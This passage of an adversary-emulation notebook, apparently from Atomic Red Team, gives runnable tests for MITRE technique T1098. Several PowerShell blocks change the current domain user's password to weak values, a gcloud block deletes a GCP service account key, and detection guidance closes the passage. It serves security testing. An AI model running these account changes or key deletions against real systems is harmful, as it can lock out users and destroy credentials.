    "```powershell\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a791058",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "3ab99a2a",
   "metadata": {},
   "source": "### Atomic Test #11 - Domain Password Policy Check: No Number in Password\nAttempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Password for current user must be stored in a credential file\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f628bbb4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "217df822",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ce53451",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "bb325a90",
   "metadata": {},
   "source": "### Atomic Test #12 - Domain Password Policy Check: No Special Character in Password\nAttempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Password for current user must be stored in a credential file\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e28329fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7570c48e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "811e1167",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "1588bc1c",
   "metadata": {},
   "source": "### Atomic Test #13 - Domain Password Policy Check: No Uppercase Character in Password\nAttempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Password for current user must be stored in a credential file\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75c99469",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 13 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "cc9f3eff",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0d2c8d1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "58fa4c51",
   "metadata": {},
   "source": "### Atomic Test #14 - Domain Password Policy Check: No Lowercase Character in Password\nAttempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Password for current user must be stored in a credential file\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c584ff22",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 14 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1501f0c7",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eafb426f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "ea832e9b",
   "metadata": {},
   "source": "### Atomic Test #15 - Domain Password Policy Check: Only Two Character Classes\nAttempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Password for current user must be stored in a credential file\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce1ae539",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 15 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ab99a8d2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef84a300",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "2c84e1d7",
   "metadata": {},
   "source": "### Atomic Test #16 - Domain Password Policy Check: Common Password Use\nAttempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Password for current user must be stored in a credential file\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78dba41e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 16 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "42fc53ea",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "905edbb2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "fa710c69",
   "metadata": {},
   "source": "### Atomic Test #17 - GCP - Delete Service Account Key\nThis Atomic will: \n  - Create a service account\n  - Create a service account key, \n  - Store the result of retrieving a single key for that service account as a variable\n  - Pass that variable for deletion\n  - Delete the service account\n\nThe idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies the deletion of an Identity and Access Management (IAM) service account key in Google Cloud Platform (GCP).\nEach service account is associated with two sets of public/private RSA key pairs that are used to authenticate. \nIf a key is deleted, the application will no longer be able to access Google Cloud resources using that key. A security best practice is to rotate your service account keys regularly.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n\n**Supported Platforms:** iaas:gcp\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Requires gcloud\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\necho \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n\n```\n##### Description: Check if user is logged in \n\n##### Check Prereq Commands:\n```sh\ngcloud config get-value account\n\n```\n##### Get Prereq Commands:\n```sh\ngcloud auth login --no-launch-browser\n\n```\n##### Description: Check if terraform is installed.\n\n##### Check Prereq Commands:\n```sh\nterraform version\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the terraform.\n\n```\n##### Description: Create dependency resources using terraform\n\n##### Check Prereq Commands:\n```sh\nstat \"$PathToAtomicsFolder/T1098/src/T1098-17/terraform.tfstate\"\n\n```\n##### Get Prereq Commands:\n```sh\ncd \"$PathToAtomicsFolder/T1098/src/T1098-17/\"\nterraform init\nterraform apply -auto-approve\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "415def0a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 17 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "9f56d361",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ngcloud config set project atomic-test-1\nKEY=`gcloud iam service-accounts keys list --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`\ngcloud iam service-accounts keys delete $KEY --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --quiet\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f86d03bd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "11d066db",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\ncd \"$PathToAtomicsFolder/T1098/src/T1098-17/\"\nterraform state rm google_service_account_key.key\nterraform destroy -auto-approve\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a39739af",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "86498368",
   "metadata": {},
   "source": "## Detection\nCollect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)"
  },
  {
   "cell_type": "markdown",
   "id": "3426db1b",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### System Activity Monitoring \n Collect system activity logs which can reveal adversary activity. \n\n Capturing system logs can show logins, user and system events, etc.  Collecting this data and potentially sending it to a centralized location can help reveal the presence of an adversary and the actions they perform on a compromised system.\n#### Opportunity\nThere is an opportunity to create a detection with a moderately high probability of success.\n#### Use Case\nA defender can implement monitoring to alert if a user account is altered outside normal business hours, from remote locations, etc.\n#### Procedures\nEnsure that systems capture and retain common system level activity artifacts that might be produced.\nMonitor Windows systems for event codes that reflect an adversary changing passwords, adding accounts to groups, etc.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}